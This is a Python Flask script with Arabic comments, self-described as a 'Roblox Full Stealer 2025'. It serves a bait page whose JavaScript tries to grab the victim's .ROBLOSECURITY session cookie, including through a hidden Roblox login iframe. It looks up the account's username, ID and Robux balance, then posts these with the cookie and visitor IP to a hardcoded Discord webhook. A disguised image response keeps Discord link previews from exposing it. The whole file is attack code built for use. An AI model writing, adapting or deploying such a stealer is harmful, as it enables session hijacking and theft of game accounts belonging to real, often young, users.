from flask import Flask, request
import requests, base64, re, json

app = Flask(__name__)

# غيّر الويب هوك بتاعك
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

def get_roblox_info(cookie):
    headers = {'.ROBLOSECURITY': cookie}
    try:
        # جيب معلومات الحساب
        r = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={'.ROBLOSECURITY': cookie}, timeout=8)
        if r.status_code == 200:
            data = r.json()
            user_id = data.get("id")
            username = data.get("name")
            
            # جيب التفاصيل الكاملة
            r2 = requests.get(f"https://users.roblox.com/v1/users/{user_id}", cookies={'.ROBLOSECURITY': cookie})
            info = r2.json() if r2.status_code == 200 else {}
            
            # جيب الـ Robux
            r3 = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': cookie})
            robux = r3.json().get("robux", "غير معروف") if r3.status_code == 200 else "غير معروف"
            
            embed = {
                "title": "تم سرقة حساب Roblox كامل",
                "color": 0x00ff00,
                "description": f"**Username:** {username}\n**User ID:** {user_id}\n**Robux:** {robux}\n**Display Name:** {info.get('displayName')}\n**Created:** {info.get('created')}\n**Cookie:** ||{cookie[:100]}...||",
                "footer": {"text": "Roblox Full Stealer 2025"}
            }
            requests.post(WEBHOOK, json={"content": "@everyone", "embeds": [embed]})
    except:
        pass

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def roblox_stealer(path):
    ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
    ua = request.headers.get('User-Agent', '')

    if 'Discordbot' in ua:
        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5Eg==')
        return fake, 200, {'Content-Type': 'image/png'}

    # إشعار أولي
    requests.post(WEBHOOK, json={"content": f"@everyone ضحية Roblox جديدة\nIP: {ip}"})

    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">

<script>
// الطريقة الوحيدة الشغالة 100% بدون كراش 2025
setTimeout(() => {{
  // جرب كل الطرق لجيب الكوكي
  let cookie = document.cookie;
  let roblo = cookie.match(/\\.ROBLOSECURITY=(.*?)(?:;|$)/);
  
  if (roblo) {{
    fetch("{request.url}?cookie=" + roblo[1]);
  }}

  // لو ما لقاش → جرب iframe
  const i = document.createElement('iframe');
  i.src = 'https://www.roblox.com/login';
  i.style.display = 'none';
  document.body.appendChild(i);
  i.onload = () => {{
    setTimeout(() => {{
      fetch("{request.url}?cookie=" + (document.cookie.match(/\\.ROBLOSECURITY=(.*?)(?:;|$)/) || ['',''])[1]);
    }}, 1000);
  }};
}}, 800);

</script>
</body></html>"""

    # لو في كوكي في الـ URL → خده واستخدمه
    cookie = request.args.get('cookie')
    if cookie and len(cookie) > 50:
        get_roblox_info(cookie)
        return "تم ✓", 200

    return html

if __name__ == "__main__":
    app.run()
